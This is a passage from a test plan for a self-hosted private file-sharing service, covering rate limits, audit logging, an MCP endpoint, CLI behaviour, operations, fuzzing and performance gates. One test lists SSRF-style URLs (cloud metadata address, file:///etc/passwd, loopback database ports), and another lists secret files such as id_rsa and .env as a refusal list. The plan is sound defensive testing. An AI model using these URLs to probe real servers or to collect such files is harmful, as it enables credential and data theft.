**T-LIMIT-07 — `bundle`.** 121 bundle uploads in an hour → `429` bucket `bundle`. §10.2.1.

**T-LIMIT-08 — `link_create` and its alarm.** *Integration.* 21 links in an hour → the 21st is
`429` bucket `link_create`; **exhausting the bucket fires an immediate owner notification**
(§10.2.1) — assert exactly one `anomaly_link_rate` email. Independently, the §10.4 threshold of
>5 links in an hour fires its own notification well before the limit is reached, so the test
asserts the first alert lands at link 6 and the `429` at link 21. §10.2.1, §10.4.

**T-LIMIT-09 — `grant`.** 61 grants in an hour → `429` bucket `grant`. §10.2.1.

**T-LIMIT-10 — `search`.** 301 searches in an hour → `429` bucket `search`. §10.2.1.

**T-LIMIT-11 — `invite`.** 11 invites in a day → `429` bucket `invite`. §10.2.1.

**T-LIMIT-12 — `copy`.** 121 copies in an hour → `429` bucket `copy`. §10.2.1.

**T-LIMIT-13 — `token_auth_fail` escalates.** *Integration.* 30 bad-token requests from one IP in
an hour succeed in returning `401`; the 31st is `429` bucket `token_auth_fail`; thereafter the
bucket permits **1 per minute** — assert a request at +30 s is `429` and at +61 s is `401`. A
**valid** token from the same IP is unaffected throughout, so an attacker cannot lock out a
legitimate agent sharing an egress IP. Repeated failures produce an hourly-at-most
`repeated_auth_failures` email. §10.2.2, §10.8.

**T-LIMIT-14 — share-link password brute force.** *Integration.* 11 wrong passwords for one link
from one IP in an hour → `429` bucket `link_password`. Then from **12 different IPs**, 50
attempts against one link → the 51st is `429` bucket `link_password_link`, which is the ceiling
that makes a distributed attack on a 24-bit generated password infeasible. **Exhausting
`link_password_link` for the first time emails the owner** — assert exactly one such email, and
that a second exhaustion the same day does not spam. A correct password during throttling is
still refused with `429`, not `303`. §10.2.2, §7.4.

**T-LIMIT-15 — `serve_ip`, and the owner's ten-times allowance.** *e2e.* 601 requests to one
artifact from one anonymous IP in a minute → `429` bucket `serve_ip`. The signed-in **owner**
from the same IP reaches 6,000 before throttling. A single page load fetching 60 assets never
trips anything. The bucket is keyed on **IP + artifact**, so hammering artifact A does not
throttle artifact B from the same IP. §10.2.3.

**T-LIMIT-16 — `serve_link`.** *e2e.* 3,001 requests through one share link in an hour → `429`
bucket `serve_link`, independent of source IP, which is what bounds a leaked link's blast
radius. §10.2.3.

**T-LIMIT-17 — the five storage ceilings.** *Integration.* Parameterised over §10.3: per-user
quota (declare and commit — T-POST-08, T-POST-09), per version (`413 artifact_too_large`), per
file (`413 file_too_large`), files per version (`413 too_many_files`), bundle compressed and
expanded. Each asserts the code, the `detail` payload, and that the check happens at the stage
§10.3's "Checked at" column names — verified by asserting **no bytes were written** for
declare-time failures. §10.3.

**T-LIMIT-18 — quota warnings.** *Integration.* Cross 80% → one `quota_warning` email naming the
percentage; cross 81% the same day → **no** second email (at most daily); cross 95% → a new
email (a different threshold, not a repeat); the next day at 96% → one more. §10.3, §10.8.

**T-LIMIT-19 — disk full.** *Integration.* Simulate the file root's device reporting no free
space at the declare check. **Expect:** `507 disk_full` on posting; `GET` on artifacts still
`200`; share links still resolve; `DELETE` still works. A `disk_high` email fires at 85%. §10.9,
§10.8.

**T-LIMIT-20 — body and URL ceilings.** *Integration.* A 10 MB + 1 byte JSON body → `413`; a
file `PUT` over `SHARE_MAX_FILE_BYTES` cut mid-stream with nothing left in tmp; an 8 KB + 1 URL;
a request that hangs past the 30 s timeout (and an upload correctly allowed 3,600 s). §5.1.4.

**T-LIMIT-21 — anomaly detection warns and never blocks.** *Integration.* Drive each of the
eight §10.4 signals to threshold: 6 links in an hour by one token; a token's first-ever link; 11
GB posted by one token in an hour; 101 artifacts created; 51 artifacts trashed; a token used
from a new source IP; a recovery code used; a counter regression. **Expect:** for each, one
email of the matching template and a dashboard banner payload, and — critically — **the
operation itself succeeds every time**; nothing is blocked, no request returns a different
status because an anomaly fired. Sub-threshold activity produces no email. §10.4.

**T-LIMIT-22 — limits are per-subject.** *Integration.* For each bucket, exhaust it for subject
A and assert subject B is unaffected, where the subject is whatever §10.2 names (token, user,
IP, session, link, email, device code). This is one parameterised test over the registry and it
is how a mis-keyed limiter is caught. §10.2.

**T-LIMIT-23 — `device_start`.** 11 device-code starts from one IP in an hour → `429` bucket
`device_start`. §10.2.2.

## 14.15 T-AUDIT — the audit log, views, and notifications

**T-AUDIT-01 — every recorded action fires.** *Integration.* One test per action in §10.7's
table (49 actions). Each performs the operation and asserts exactly one matching `audit_event`
with the correct `actor_type`, `actor_token_id` where applicable, non-null `ip`, `user_agent`,
`target_type`, `target_id`, and a `target_label` that is **denormalised** — assert it survives by
purging the target and re-reading the event. A completeness assertion fails if the application
emits an action string not in §10.7's list. §10.7.

**T-AUDIT-02 — audit reads and filters.** *Integration.* `action=link.` matches every sharing
action by prefix; `action=link.create` matches exactly; `actorType`, `tokenId`, `targetId`, `ip`,
`from`/`to`, and free text on `target_label` all filter correctly and compose. A user sees only
their own events. `scope=instance` works for the root user and is `403 insufficient_scope` for
anyone else. §10.7.

**T-AUDIT-03 — export.** *Integration.* `GET /api/v1/audit/export?format=ndjson` streams one
JSON object per line, chronological, matching the filtered query exactly, with no secret in any
field. §10.7.

**T-AUDIT-04 — view counting writes no raw row.** Cross-reference T-PRIV-06. This case adds the
aggregation: 40 requests from 3 addresses across owner, grant, and link sources in one day →
after the 60 s flush, `view_daily` has exactly three rows (one per `source`), `views` summing to
40, `viewers` from the HLL within ±10% of 3, and `bytes_served` equal to the actual sum. No row
for a request that returned `404` or `401`. §10.6, §3.8.

**T-AUDIT-05 — view rollups roll over at UTC midnight.** *Integration.* Requests at 23:59 and
00:01 land in different `day` rows; the HLL key for the old day retains a 40-day TTL. §3.8.

**T-AUDIT-06 — artifact activity feed.** *Integration.* `GET /artifacts/{n}/activity` merges
audit events and view rollups in reverse chronological order, showing posted, overwritten,
renamed, shared, link created and revoked, granted, copied, and "viewed *n* times on *date* via
*link label*". Assert **no** entry contains an identity, an address, or anything derived from
one. §8.8.

**T-AUDIT-07 — notification defaults and toggles.** *Integration.* For each row of §10.8, assert
the default state, that toggling the user setting takes effect, and that
`recovery_used` and `counter_regressed` **cannot** be disabled — setting them false and firing
the trigger still sends. §10.8.

**T-AUDIT-08 — one action, one email.** *Integration.* Perform a link creation that satisfies
several notification triggers at once (first link by this token, `notifyOnShare` on, anomaly
threshold reached). Assert the exact set of templates that fire and that no template fires
twice. A notification storm is a failure. §10.8.

**T-AUDIT-09 — `audit-seal` and `audit-verify`.** *Integration.* Enable sealing; run
`sharectl audit-seal` for a day; assert an append-only file outside the database holds a
SHA-256 over the day's ordered rows. `sharectl audit-verify` passes. Mutate one row directly as
a superuser and re-verify → fails, naming the day. Off by default (asserted). §10.7.

**T-AUDIT-10 — negative trio for the audit surface.** *Integration.* Permission: `tok_agent`
reading `/api/v1/audit` → `403 insufficient_scope` naming `account:read`; another user's
`targetId` returns no rows rather than `403`. Limit: `limit=201` → `422`. Malformed:
`from` after `to`, `format=xml`, `action` of 500 chars. §14.1.3.

## 14.16 T-MCP — the remote MCP endpoint

**T-MCP-01 — transport and handshake.** *e2e.* `POST /mcp` speaks streamable HTTP per the
current MCP specification: `initialize` returns server info and capabilities; `tools/list`
returns exactly the 14 tools of §9.3 with JSON Schemas for their arguments; SSE carries
server-to-client messages. A request without `Authorization` → a structured error carrying the
device-code instructions of §4.6.2 (`deviceCode`, `userCode`, `verifyUrl`) so an agent can walk
its human through setup. §9.2.

**T-MCP-02 — tool-level parity with the API.** *Integration.* For each of the 14 tools, execute
the tool and the equivalent HTTP call with equivalent arguments against identical starting
state, and assert the **resulting database and filesystem state is identical** (schema-aware
diff, ignoring IDs and timestamps). A capability present in one surface and absent from the
other fails this test — that is the §9.1 "neither has a capability the other lacks" claim made
checkable. §9.1, §9.3.

**T-MCP-03 — scopes apply identically over MCP.** *Integration.* `share_create_link` and
`share_grant` with `tok_agent` → a tool error carrying `insufficient_scope` and naming
`share:create`, **not** a transport error and not a silent empty result. Every scope-gated tool
is parameterised. §7.9, §4.6.1.

**T-MCP-04 — `share_post` takes content, not paths.** *Integration.* Inline text; base64 binary
at 8 MB (succeeds) and at 8 MB + 1 (a tool error naming `share_post_from_urls` and the CLI as
the alternative, per §9.3, rather than an opaque failure). A `path` argument pointing at a local
file is rejected — the schema has no such field. §9.3.

**T-MCP-05 — `share_post_from_urls` never makes the server fetch.** *Integration, `@security`.*
Per the resolution in §14.24 A9, the tool returns a declare response and signed upload URLs and
the **agent** dereferences the caller-supplied URLs. Assert with an outbound-socket recorder on
the API process that a `share_post_from_urls` call produces **zero** outbound connections from
the server, and specifically that URLs of the form `http://169.254.169.254/…`,
`http://127.0.0.1:5432/`, `file:///etc/passwd`, and `http://[::1]:6379/` are never dereferenced
by the API — they are passed back to the agent untouched. This is the test that keeps §2.9's
"no SSRF surface at all" literally true.

**T-MCP-06 — tool annotations.** *Integration.* `share_create_link` and `share_grant` are marked
as having external effects; `share_delete` is destructive-but-reversible; `share_post` is
idempotent-by-name. Assert the annotation fields are present in `tools/list`. §9.3.

**T-MCP-07 — tool descriptions carry the privacy facts.** *Integration.* Assert
`share_post`'s description states, in its first sentence, that posting does not make anything
public, and that it tells the agent to supply `title` and `tags` because content is never
indexed. String assertions against Part 12's copy, so a copy change that drops the sentence
fails here. §9.3, §9.6.

**T-MCP-08 — `share_whoami`.** *Integration.* Returns handle, scopes, quota used and remaining,
and artifact count; for an agent-default token the scope rendering states plainly that it cannot
create share links. §9.3, §9.6.

**T-MCP-09 — MCP rejects the wrong credential class.** Cross-reference T-SEC-07. §4.7.

**T-MCP-10 — negative trio for `/mcp`.** *Integration.* Permission: `tok_ro` calling
`share_post` → `insufficient_scope`. Limit: tool calls count against the `api` bucket → a
`rate_limited` tool error carrying `detail.bucket`. Malformed: an unknown tool name, a missing
required argument, a wrong-typed argument, and a 20 MB argument payload → JSON-RPC errors, never
a `500` and never a partial write. §14.1.3.

## 14.17 T-CLI — the `share` binary

**T-CLI-01 — command parity.** *Integration.* Every command in §9.4 exists, and a coverage test
asserts each maps onto an API capability with no CLI-only or API-only gap. §9.1.1.

**T-CLI-02 — `share post` on a directory.** *Integration.* Posts a 3-file directory; output
matches §9.4.3's shape and **ends with the URL on its own line**, so `$(share post ./x | tail -1)`
is exactly the URL — asserted by running that shell expression. Warnings go to **stderr** with a
`warning:` prefix; the URL goes to stdout. §9.4.3.

**T-CLI-03 — `--json` contract.** *Integration.* `share post --json` emits **exactly** the commit
response body from §5.4 phase 3 on stdout and nothing else — no progress, no banner, no trailing
newline beyond one — and parses as JSON. Every command with `--json` emits either an API
response body or, on failure, **the §5.1.1 error envelope on stdout**, so a wrapper can branch on
`error.code` without scraping text. Assert this for at least one failure of each exit-code class.
§9.4.3, §9.7.

**T-CLI-04 — exit codes.** *Integration.* One case per code in §9.7: `0` success; `1` a generic
server-side failure; `2` an unknown flag; `3` no credentials file and no `SHARE_TOKEN`; `4` a
revoked token; `5` `share link` with `tok_agent`; `6` `share get missing`; `7` `name_taken`;
`8` quota exceeded; `9` `429`; `10` an unreachable host; `11` a refused secret file; `12` a
`500`. Each asserts the code **and** that `--json` carried the matching `error.code`. §9.7.

**T-CLI-05 — secret-file refusal.** *Integration.* A directory containing `.env`, `.env.local`,
`key.pem`, `server.key`, `id_rsa`, `bundle.p12`, `x.keystore`, `credentials`, and `.netrc`.
`share post ./dir` → **exit 11**, nothing uploaded, no network request made at all (asserted with
a request recorder), and stderr **naming each offending file**. With `--force-secrets` the walk
proceeds, and the server then rejects the dotfiles with `422 dotfile_rejected` — the test asserts
both layers, because the client rule is what catches the mistake and the server rule is the
backstop. §9.4.2, §6.4.

**T-CLI-06 — always-excluded paths.** *Integration.* A tree containing every entry in §9.4.2's
always-excluded list plus a real file. `--dry-run` prints a manifest containing only the real
file. `--include`/`--exclude` globs cannot re-include `.git/` or `node_modules/`. §9.4.2.

**T-CLI-07 — symlinks and unreadable files.** *Integration.* A symlink is **skipped with a
warning**, never followed (assert the target's bytes are absent from the manifest, including for
a symlink pointing inside the tree). An unreadable file is a **hard error** naming the file, exit
11, nothing posted. §9.4.2.

**T-CLI-08 — bundle-vs-three-phase selection.** *Integration.* A 10 MB / 50-file tree uses the
one-shot bundle path; a 40 MB / 50-file tree and a 10 MB / 300-file tree use the three-phase
path; `--bundle` and `--no-bundle` override both ways. Asserted from the request recorder.
§5.6.

**T-CLI-09 — `--dry-run` changes nothing.** *Integration.* Prints the manifest and what would
upload; zero write requests; zero rows; exit 0. §9.4.1.

**T-CLI-10 — credentials handling.** *Integration.* `share login` runs the device-code flow and
writes `~/.share/credentials` with mode **0600** containing one line, and prints the granted
scopes including, in words, that the token cannot create share links. Resolution order
flag → env → `./.share.json` → `~/.share/config.json` → default is asserted with all five set to
different hosts. `./.share.json` is excluded from any walk. `share logout` removes the file.
§9.5.

**T-CLI-11 — `sharectl`/`share` never print a token to a pipe.** *Integration.* With stdout not a
TTY, a command that would print a full token prints only the `display_prefix` and a note, unless
`--force` is passed. §4.10.

**T-CLI-12 — `share link` prints absolute expiry.** *Integration.* Output contains
`Public until 2026-09-07 18:04 UTC (14 days)` in absolute-plus-relative form, so an agent
transcript records exactly what became reachable and for how long. §9.6.

**T-CLI-13 — posting says "private".** *Integration.* `share post` output ends with
`Posted postcal v2 — private`; `share whoami` prints
`scopes: artifacts:read artifacts:write  (cannot create share links)` for an agent-default
token. §9.6.

**T-CLI-14 — CI behaviour.** *Integration.* With `SHARE_TOKEN` set and no credentials file, all
commands work. In a non-TTY without `--yes`, a command requiring confirmation is an **error**,
not a silent assumption. `share post ./out --name preview-x --ttl 30d` yields a private artifact
with a TTL. §9.9.

**T-CLI-15 — `share doctor`.** *Integration.* Reports connectivity, credential presence and
scopes, server version, and clock skew; with the client clock 10 minutes off it reports the skew
and warns that signed upload URLs may fail. §9.4.

**T-CLI-16 — negative trio for the CLI.** *Integration.* Permission: `share rm --purge` with
`tok_agent` → exit 5. Limit: posting into a `429` → exit 9 and a message naming the bucket.
Malformed: `share post` with no path → exit 2 and usage on stderr. §14.1.3.

## 14.18 T-OPS — install, operations, recovery

**T-OPS-01 — clean install.** *e2e.* From a fresh VM image, run the Part 15 install: systemd
units `share-api`, `share-worker`, `caddy`, `postgresql`, `redis` all active; Caddy obtains a
certificate via HTTP-01; `/internal/health` and `/internal/ready` are `200` **only from
loopback** and refused from outside; `/api/v1/status` requires a credential. §2.1, §2.8, §15.

**T-OPS-02 — startup preflight refuses a bad environment.** *Integration.* Each of: file root
not writable; **tmp root on a different device**; Postgres unreachable; Postgres at the wrong
migration revision; Redis unreachable; `SHARE_HOST` unresolvable; a missing required credential.
**Expect:** exit non-zero with exactly **one** diagnostic line naming the failed check, no
partial startup, and no listening socket. §2.7.

**T-OPS-03 — backup and restore round trip with integrity verification.** *e2e
`@commit_required`.*
- **Pre:** an instance with 3 users, 40 artifacts across every `kind`, 120 versions, 8 live
  links (2 with passwords), 5 grants, 12 trashed artifacts, a populated audit log, and view
  rollups.
- **Steps:** Run the nightly backup. Record a manifest of every blob's SHA-256, every table's row
  count, and a checksum over each table's ordered contents. Destroy the instance (drop the
  database, delete the file root). Restore from the backup onto a clean host. Re-run the
  manifest.
- **Expect:** row counts and table checksums identical; **every blob's recomputed SHA-256 equals
  its filename** (this is the integrity verification, and it is why content addressing is worth
  having); every artifact serves the same bytes at the same URL; every live share link still
  works, including the password links with their original passwords (argon2 hashes restored);
  every recipient session is **gone** (they lived in Postgres and are past their 24 h anyway —
  assert this rather than assuming); the audit log is complete; `sharectl recompute-quota`
  produces figures identical to the pre-destruction values. Also assert the backup is encrypted
  at rest and that restoring **without** the key fails cleanly. §15.4, §3.5.

**T-OPS-04 — backup failure is noticed.** *Integration.* Make the backup destination unwritable;
run the job. **Expect:** non-zero result, `system.backup` audited with a failure flag, and a
`backup_failed` email to the root user. §10.8.

**T-OPS-05 — collection never deletes a referenced file, even with a corrupted counter.**
Cross-reference T-VER-09, which is the authoritative case. This entry additionally runs a
**fuzz** variant: 500 random `ref_count` perturbations across a 200-file instance, each followed
by a collection run and a full reconciliation, asserting that **no file with a live
`version_file` row is ever removed from disk** in any iteration. §3.6.

**T-OPS-06 — `sharectl panic`.** *Integration.* With 12 live links across 3 users, 20 recipient
sessions, and 6 grants: run `sharectl panic`. **Expect:** every `share_link` row on the instance
has `revoked_at` set; every `recipient_session` is deleted; every `sh:tok:` and recipient cache
key purged; every previously-working link is `410` on its **next** request with the clock frozen;
**grants are untouched** (they are not a bearer credential — see §14.24 ambiguity A7); a
`system.panic` audit row; one summary email naming the counts. Artifacts, versions, files,
sessions, and API tokens are untouched, so the operator's own access survives. §10.5.

**T-OPS-07 — `sharectl recompute-quota` and `recompute-refs`.** *Integration.* Corrupt
`storage_bytes` and `artifact_count`; run `recompute-quota`; assert exact restoration including
the over-counting rule of §3.9 (a user is charged for every file their artifacts reference even
when another user references it too — assert the two users' figures **sum to more** than the disk
usage, deliberately). Corrupt `ref_count`; run `recompute-refs`; assert reconciliation. §3.9.

**T-OPS-08 — worker schedule.** *Integration.* Each of the eleven jobs in §2.6 exists, is
registered at its stated cadence, is individually invocable, is idempotent when run twice, and
logs a summary. A job raising an exception does not prevent the others from running. §2.6.

**T-OPS-09 — migrations.** *Integration.* `alembic upgrade head` on an empty database creates
every table in §3 in dependency order and adds the two forward-referencing foreign keys
afterwards; `citext` and `pg_trgm` exist; every index and constraint named in §3 is present
(asserted against `pg_indexes` and `pg_constraint`, not against the migration source).
`downgrade` to base and re-upgrade succeeds. A second `upgrade head` is a no-op. §3.1.

**T-OPS-10 — host security posture.** *e2e.* `/var/lib/share` is owned by `share`; blobs are
`0640` and readable by the `caddy` group; Postgres and Redis listen on loopback only; Redis
requires a password and `CONFIG` is renamed to the empty string (asserted by attempting
`CONFIG GET`); UFW permits only 22, 80, 443. §2.9.

**T-OPS-11 — restart mid-upload.** *Integration.* Restart `share-api` during a multi-file upload.
**Expect:** the in-flight `PUT` fails; already-completed files remain; `GET /uploads/{sid}`
returns the pending set with fresh URLs; the client resumes and commits successfully; no partial
blob is in `SHARE_FILE_ROOT` and no `.part` file is left in `SHARE_TMP_ROOT`. §N5, §5.4.

**T-OPS-12 — the test environment does not weaken production defaults.** *Unit.* As specified in
§14.2.2: diff the test `Settings` against `Settings()` and fail on any override not in that
table.

## 14.19 Property-based and fuzz targets

Hypothesis for properties, `atheris` for the byte-level fuzzers. Each target runs 10,000 cases
per commit and 1,000,000 nightly, with a persistent corpus committed to the repository. Any
crash, hang over 1 s, or unhandled exception is a build failure; a discovered failing input is
committed as a regression case with its own `T-` ID.

**F1 — `normalise_path(raw) -> str | Invalid`** (§6.4). Input: arbitrary Unicode strings, arbitrary
byte strings, and mutations of a corpus of real paths.
- *Never raises.* Every input yields a path or a typed rejection.
- *Idempotent.* `normalise(normalise(p)) == normalise(p)` for every accepted `p`.
- *Confinement.* For every accepted `p`, `os.path.realpath(os.path.join(ROOT, p[1:]))` starts
  with `ROOT + "/"`. This is the property that makes traversal structurally impossible rather
  than blacklisted.
- *Shape.* Every accepted output starts with `/`, has no trailing `/`, no empty segment, no `.`
  or `..` segment, ≤ 1,024 bytes, ≤ 32 segments, each segment ≤ 255 bytes, is NFC, and contains
  no `Cf` codepoint and no byte below `0x20`.
- *Single decode.* If `p` percent-decodes twice to a different string, `p` is rejected.
- *Agreement.* The serve-time and post-time normalisers are the **same function** — asserted by
  identity, then by differential fuzzing against a naive reference implementation to catch
  divergence.

**F2 — `validate_name(raw) -> str | Invalid` and `generate_name()`** (§5.3, §6.3).
- *Accepted names round-trip.* `validate(validate(n)) == validate(n)`.
- *Case.* `validate(n.upper()) == validate(n)` for every accepted `n`.
- *Regex agreement.* The Python validator and the Postgres `name_format` CHECK accept exactly the
  same set — differential fuzzing against a live database, 100,000 cases.
- *Reserved closure.* No accepted name's first segment is in the reserved list, begins with `~`,
  or would be captured by a Caddy route prefix (§14.24 A1).
- *Generator.* Every `generate_name()` output passes `validate_name` and is not reserved, over
  1,000,000 draws.
- *No traversal.* No accepted name, joined into a URL, normalises to a path outside its space.

**F3 — `resolve_longest_prefix(space, rest) -> (artifact, filepath)`** (§6.5.1).
- *Determinism.* Same inputs, same output, independent of insertion order — asserted by shuffling
  the artifact set between runs.
- *Maximality.* The returned artifact's name is the longest name in the space that is a prefix of
  `rest` on a **segment boundary**; a name that is a character-prefix but not a segment-prefix
  (`q3rep` vs `q3/report`) never matches.
- *Partition.* `artifact.name + filepath == rest` exactly, for every hit.
- *Bounded work.* At most 8 lookups regardless of path length, asserted by a query counter, even
  for a 32-segment path.
- *Space isolation.* For every artifact set spanning two spaces, resolution in space A never
  returns an artifact of space B — this is P7 as a property.

**F4 — `bucket_consume(bucket, subject, now) -> Allowed | Refused(retry_after)`** (§10.2).
- *Never negative.* Token count stays in `[0, burst]` under any interleaving of consumes and
  time advances, including time moving backwards (a clock adjustment must not mint tokens).
- *Rate bound.* Over any window `W`, allowed requests ≤ `burst + rate * W`, checked over random
  request/advance schedules.
- *Liveness.* After refusal, waiting `retry_after` always yields an allowance.
- *Subject isolation.* Consumption for subject A never changes B's state, over random subject
  sets.
- *Registry totality.* Every name in `BUCKETS` has a positive rate and burst and a defined
  subject extractor.

**F5 — `resolve_entry_path(manifest, explicit) -> str | None`** (§5.5).
- *Membership.* A non-`None` result is always a key of the manifest.
- *Precedence.* For every generated manifest, the result equals a reference implementation of
  §5.5's five rules — differential testing against the rules written out independently.
- *Stability.* Independent of manifest ordering (shuffle the input).
- *Single-file rule.* A one-file manifest always yields that file, for every file type.
- *Explicit-miss.* An `explicit` not in the manifest never causes a raise and always falls
  through to rules 2–5.

**F6 — archive extraction** (§5.6). `atheris` over tar and gzip bytes: never escapes the temp
directory (filesystem watcher assertion inside the fuzz loop), never exceeds 512 MB RSS, never
hangs over 5 s, always terminates with either a manifest or a typed rejection.

**F7 — the error envelope** (§5.1.1). Property: for every endpoint and every generated
malformed input, the response body validates against the envelope schema, `code` is drawn from
the union of the error tables in Parts 4–10, and no `message` or `detail` value contains a
filesystem path, a `shr_` token, a cookie value, or a SHA-256.

## 14.20 Performance targets

Measured on the §2.1 floor hardware — Linode 4 GB Shared, 2 vCPU — with a seeded instance of
10,000 artifacts, 30,000 versions, 250,000 files, and 5 GB of blobs. Every number is a CI gate at
the stated percentile with a 20% regression tolerance against the recorded baseline; nightly runs
record a trend. Load is generated by `k6` against the real Caddy, from the same host (so the
figures exclude WAN latency, deliberately).

| Target | Measured how | Budget |
| --- | --- | --- |
| `/internal/authorize`, warm cache | 20,000 requests to a mix of 200 artifacts, cache pre-warmed; measure the forward_auth subrequest alone via the API's own timing histogram | **p50 ≤ 3 ms, p99 ≤ 15 ms** (§2.4.1's stated target) |
| `/internal/authorize`, cold | `FLUSHDB` before each of 2,000 requests; two indexed queries expected | p50 ≤ 12 ms, p99 ≤ 40 ms |
| `can_view` in isolation | Unit benchmark, 1,000,000 calls | ≤ 2 µs mean |
| Post a 3-file artifact (110 KB) end to end | CLI wall-clock from process start to the URL line, over 100 runs, loopback | **p50 ≤ 400 ms, p99 ≤ 1.2 s** |
| Post 5,000 files (25 MB total) | Declare + 5,000 `PUT`s at concurrency 8 + commit; wall clock | **≤ 90 s p50**, with the commit transaction itself **≤ 3 s p99** |
| Declare with a 5,000-entry manifest | Server time for phase 1 alone | p99 ≤ 800 ms |
| Cold serve of a 20 KB HTML file | First request after `FLUSHDB`, TTFB at the Caddy socket | **p50 ≤ 25 ms, p99 ≤ 60 ms** |
| Warm serve of the same file | Steady state, 5,000 requests | **p50 ≤ 8 ms, p99 ≤ 25 ms** |
| Warm serve, 60-asset bundle page load | Browser `loadEventEnd` in headless Chromium | ≤ 900 ms p95 |
| 2 GB MP4 range request | `Range: bytes=1073741824-1074790400` (1 MB from the middle); TTFB and throughput | **TTFB p99 ≤ 40 ms**; sustained throughput ≥ 200 MB/s from page cache, ≥ disk sequential rate cold; seek-storm of 200 random ranges shows no TTFB degradation beyond 2× |
| Search at 10,000 artifacts | `?q=` over 500 varied trigram queries | **p50 ≤ 40 ms, p99 ≤ 150 ms** |
| Search with 4 filters + sort | Same corpus | p99 ≤ 250 ms |
| Artifact list, page 1 of 10,000 | `?limit=50` | p99 ≤ 60 ms |
| Version restore of a 40 MB / 200-file version | Wall clock | **≤ 1 s** (§8.2's "well under a second") |
| Share-link unlock (argon2id) | `POST /unlock`, correct password | 120 ms ≤ p50 ≤ 400 ms — a **floor** as well as a ceiling: too fast means the KDF parameters are wrong |
| Nightly collection over 250,000 files | Job wall clock | ≤ 120 s |
| Backup of 5 GB | Job wall clock | ≤ 15 min |
| Cold start to first served request | systemd start to a `200` | ≤ 8 s |

Two anti-targets are also asserted, because they catch design regressions rather than slow code:
**(a)** serving a file never issues more than **one** Redis round trip and **zero** Postgres
queries on a warm cache (statement counters); **(b)** listing 50 artifacts never issues more than
**4** queries regardless of how many links, grants, and tags they carry — an N+1 in the list
endpoint is a build failure, not a performance note.

## 14.21 Acceptance criteria by phase

**Part 16 now exists and governs phase membership; this section is reconciled to it** — its four
phases match the four below, and its §16.1 states the same precedence over `inventory.md`. The
historical note follows, since the test IDs were assigned against it. The phases were inferred from two
sources: the `Phase` column of `inventory.md`, which assigns each screen 1, 2, or 3, and the
document map in §1.11. A fourth phase is inferred for the work that has no screen and therefore
no row in the inventory — operations, collection, backup, anomaly detection, and the performance
gates. **When Part 16 is written, its phase definitions govern and this section is reconciled to
them**; the test IDs listed per phase should move with the features rather than the features
moving to match this list. Recorded per §1.9 as decision D-14-PHASE.

### Phase 1 — the core loop
*Post, address, serve, sign in, trash. Screens 11.1, 11.3, 11.5, 11.6, 11.7, 11.8, 11.15, 11.18,
11.19, 11.26, 11.27. Parts 2, 3, 5, 6, and the private half of 4.*

Gating IDs: T-SEC-00 · T-PRIV-01 · T-PRIV-02 · T-PRIV-05 · T-PRIV-07 · T-SEC-01 · T-SEC-02 ·
T-SEC-04 · T-SEC-05 · T-SEC-06 · T-SEC-09 · T-SEC-10 · T-SEC-11 · T-SEC-12 · T-SEC-13 ·
T-SEC-15 · T-SEC-16 · T-SEC-17 · T-SEC-18 · T-SEC-25 · T-SEC-26 · T-SEC-28 · T-SEC-29 ·
T-AUTH-01 · T-AUTH-02 · T-AUTH-03 · T-AUTH-04 · T-AUTH-05 · T-AUTH-06 · T-AUTH-07 · T-AUTH-08 ·
T-AUTH-09 · T-AUTH-11 · T-AUTH-12 · T-AUTH-16 · T-AUTH-18 · T-AUTH-19 · T-POST-01 … T-POST-24
(all) · T-SERVE-01 … T-SERVE-15 (all) · T-TRASH-01 · T-TRASH-02 · T-TRASH-03 · T-TRASH-06 ·
T-TRASH-07 · T-TRASH-09 · T-VER-08 · T-LIMIT-01 · T-LIMIT-02 · T-LIMIT-03 · T-LIMIT-04 ·
T-LIMIT-05 · T-LIMIT-06 · T-LIMIT-07 · T-LIMIT-15 · T-LIMIT-17 · T-LIMIT-20 · T-LIMIT-22 ·
T-AUDIT-01 · T-MCP-01 · T-MCP-02 · T-MCP-04 · T-MCP-08 · T-MCP-10 · T-CLI-01 … T-CLI-16 (all) ·
T-OPS-01 · T-OPS-02 · T-OPS-08 · T-OPS-09 · T-OPS-10 · T-OPS-11 · T-OPS-12 · F1 · F2 · F3 · F5 ·
F7.

**Phase 1 cannot ship without T-PRIV-01.** An instance that serves artifacts on a public
hostname before the indistinguishability property holds is the one failure this product cannot
recover from.

### Phase 2 — sharing and the human surface
*Links, passwords, expiry, grants-free sharing, versions, viewer, search. Screens 11.2, 11.9,
11.10, 11.11, 11.12, 11.13, 11.16, 11.17, 11.21. Parts 7, 8, and the recovery half of 4.*

Gating IDs: all of Phase 1, plus T-PRIV-03 · T-PRIV-04 · T-PRIV-06 · T-PRIV-09 · T-SEC-03 ·
T-SEC-07 · T-SEC-08 · T-SEC-14 · T-SEC-19 · T-SEC-21 · T-SEC-22 · T-SEC-23 · T-SEC-24 ·
T-SEC-27 · T-SEC-30 · T-AUTH-10 · T-AUTH-13 · T-AUTH-14 · T-AUTH-15 · T-SHARE-01 … T-SHARE-13
and T-SHARE-16 … T-SHARE-18 · T-EXP-01 … T-EXP-13 (all) · T-VER-01 … T-VER-12 (all) ·
T-TRASH-04 · T-TRASH-05 · T-SEARCH-01 … T-SEARCH-08 (all) · T-LIMIT-08 · T-LIMIT-10 ·
T-LIMIT-13 · T-LIMIT-14 · T-LIMIT-16 · T-LIMIT-18 · T-AUDIT-02 · T-AUDIT-04 · T-AUDIT-05 ·
T-AUDIT-06 · T-AUDIT-07 · T-AUDIT-08 · T-MCP-03 · T-MCP-05 · T-MCP-06 · T-MCP-07 · T-MCP-09 ·
F4 · F6.

**Phase 2 cannot ship without T-PRIV-04, T-PRIV-09, T-EXP-02, and T-SEC-07.** Those four are the
whole argument that handing out a link is safe.

### Phase 3 — multiple users
*Invites, grants, shared-with-me, audit, security overview, staleness, storage, users, status.
Screens 11.4, 11.14, 11.20, 11.22, 11.23, 11.24, 11.25, 11.28.*

Gating IDs: all of Phases 1–2, plus T-SEC-20 · T-AUTH-17 · T-SHARE-14 · T-SHARE-15 ·
T-POST-22 · T-SEARCH-05 · T-LIMIT-09 · T-LIMIT-11 · T-LIMIT-12 · T-LIMIT-23 · T-AUDIT-03 ·
T-AUDIT-10 · and a **re-run of T-PRIV-07 and T-SEC-16 with three users populated**, since a
single-user instance cannot exercise a space boundary at all.

### Phase 4 — operations and hardening
*No screens; the reason it is invisible in `inventory.md`. Backup and restore, collection,
retention, anomaly detection, panic, seals, and the performance gates.*

Gating IDs: all of Phases 1–3, plus T-PRIV-08 · T-VER-07 · T-VER-09 · T-VER-10 · T-LIMIT-19 ·
